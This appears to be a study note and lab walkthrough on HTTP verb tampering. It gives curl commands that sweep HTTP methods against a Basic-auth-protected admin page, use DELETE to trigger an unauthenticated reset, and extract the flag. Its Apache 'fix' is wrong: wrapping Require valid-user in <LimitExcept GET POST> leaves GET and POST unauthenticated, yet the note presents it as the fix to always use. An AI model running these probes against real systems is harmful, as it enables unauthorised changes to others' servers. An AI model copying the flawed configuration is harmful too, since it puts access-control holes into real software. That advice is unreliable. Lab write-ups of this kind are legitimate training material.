# Section 3 — Bypassing Basic Authentication via Verb Tampering

---

## Exploitation Flow

```
1. Identify the protected endpoint (401/redirect on GET/POST)
2. Run OPTIONS to discover what verbs the server accepts (Allow: header)
3. Try every accepted verb — note response codes
4. Verbs returning 200 with no auth prompt = bypass
5. Trigger the target action via the bypass verb
```

---

## OPTIONS — Reconnaissance Verb

```bash
curl -i -X OPTIONS "http://TARGET/admin/page.php"
```
> Sends an OPTIONS request and shows the full response headers with `-i`. The `Allow:` header lists which HTTP methods the server accepts. Use this as a starting point before sweeping all verbs.

Look for the `Allow:` header:
```
Allow: POST,OPTIONS,HEAD,GET
```

This tells you which verbs the server WILL accept, but doesn't tell you which BYPASS the auth check. That requires the full sweep.

---

## Verb Sweep

```bash
for V in GET HEAD POST PUT DELETE OPTIONS PATCH TRACE; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -X "$V" "http://TARGET/admin/reset.php")
  echo "$V: $code"
done
```
> Tries every common HTTP method and prints just the status code for each. A 200 from an unauthenticated request when GET returns 401 or 403 means that verb bypasses the auth check.

Interpretation:
- `401`/`403`/`302` → auth enforced for this verb
- `200` → handler ran without auth check
- `405` Method Not Allowed → verb explicitly blocked at server level
- `501` Not Implemented → verb not supported

Any `200` from an unauthenticated probe = exploitable.

---

## Why HEAD Often Works

`<Limit GET POST>` directives in Apache only apply the auth rule to listed verbs. `HEAD` runs the same handler as `GET` internally (it's literally `GET` with the response body suppressed). Server-side state changes (file writes, DB updates, resets) still execute — you just don't see the response body.

```apache
# Vulnerable — only GET and POST checked
<Limit GET POST>
    Require valid-user
</Limit>

# Fixed — applies rule to ALL verbs except listed
<LimitExcept GET POST>
    Require valid-user
</LimitExcept>
```
> The vulnerable `<Limit>` block only protects the listed verbs — everything else is unauthenticated. `<LimitExcept>` flips this: it protects all other verbs and leaves the listed ones open. Always use `<LimitExcept>` for auth rules.

> Same pattern in J2EE `<security-constraint>` with `<http-method>` — explicit listing = denylist = vulnerable.

---

## Lab — Reset File Manager via Verb Tampering

**Target:** `154.57.164.66:30765`

File manager with a Reset button at `/admin/reset.php`. Basic auth protects `/admin/`.

### Step 1 — Confirm protection
```bash
curl -sk -i "http://154.57.164.66:30765/admin/reset.php" | head -3
# HTTP/1.1 401 Unauthorized
# WWW-Authenticate: Basic realm="Admin Panel"
```
> Confirms the endpoint is protected by HTTP Basic Authentication. The `WWW-Authenticate` header tells you the auth type and realm. Replace the IP and port with the current lab target.

### Step 2 — Verb sweep
```bash
for V in GET HEAD POST PUT DELETE OPTIONS PATCH TRACE; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -X "$V" "http://154.57.164.66:30765/admin/reset.php")
  echo "$V: $code"
done
```
> Sweeps all common methods against the protected endpoint. The results reveal which verbs the auth config covers and which slip through.

Result:
```
GET:     401      ← auth required
HEAD:    401      ← auth required (different from typical labs)
POST:    401      ← auth required
PUT:     200      ← BYPASS
DELETE:  200      ← BYPASS
OPTIONS: 200      ← BYPASS
PATCH:   200      ← BYPASS
TRACE:   405      ← method not allowed
```

> Lab variation note: the section's example showed HEAD as the bypass verb, but this lab's auth config covers HEAD too. The auth must be listing `<Limit GET HEAD POST>` — protecting only those three. PUT/DELETE/OPTIONS/PATCH slip through.

### Step 3 — Trigger reset via bypass verb
```bash
curl -sk -X DELETE "http://154.57.164.66:30765/admin/reset.php" -o /dev/null
# Reset runs without auth — files cleared
```
> Sends a DELETE request to the protected endpoint. Because the Apache auth rule only covers GET/HEAD/POST, DELETE goes through without credentials. `-o /dev/null` discards the response body since we only care that the reset action runs.

### Step 4 — Verify reset + grab flag
```bash
curl -sk "http://154.57.164.66:30765/" | grep -oE 'HTB\{[^}]+\}'
# → HTB{4lw4y5_c0v3r_4ll_v3rb5}
```
> Fetches the home page after the reset and extracts the flag with a regex. Replace the IP and port with the current lab target.

**Flag:** `HTB{4lw4y5_c0v3r_4ll_v3rb5}`

> Flag name reinforces the lesson: ALWAYS cover ALL verbs in auth config.

---

## Burp Workflow (alternative)

1. Intercept the original `GET /admin/reset.php`
2. Right-click → `Change Request Method` → switches GET ↔ POST
3. For other verbs: manually edit the verb in the request line
4. Send to Repeater → iterate through verbs comparing responses
5. Identify which verbs return 200 + content-length suggesting the handler ran

---

## Exam Notes

- **OPTIONS first** — saves time by showing what the server even accepts
- **HEAD is the classic bypass verb** but not the only one — labs often vary which verb the auth config misses
- The `<Limit GET POST>` denylist pattern is the canonical signature — when found in Apache config, all other verbs are auth-free
- Any verb returning 200 from an unauthenticated probe is exploitable — try it for state changes (resets, writes, deletes)
- The fix is `<LimitExcept GET POST>` (allowlist) — protects everything EXCEPT the listed verbs. Apache documentation explicitly recommends this.
- For real engagements: this bug is common in legacy `.htaccess`-protected admin pages — quick to find, quick to report
